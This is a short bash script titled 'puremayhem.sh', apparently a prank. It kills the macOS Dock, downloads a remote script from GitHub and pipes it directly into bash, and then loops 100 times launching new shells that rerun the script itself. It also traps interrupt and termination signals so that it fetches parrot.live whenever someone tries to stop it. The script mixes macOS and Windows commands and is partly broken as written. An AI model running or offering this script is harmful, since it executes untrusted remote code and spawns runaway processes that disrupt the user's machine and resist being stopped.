
#!/bin/bash
# puremayhem.sh
killall Dock
curl -s -L https://raw.githubusercontent.com/keroserene/rickrollrc/master/roll.sh | bash
for ((x = 0; x<100; x++)); 
do
        start cmd.exe/k sh "~/Desktop/puremayhem.sh"
        trap "curl parrot.live" SIGINT SIGTERM
done
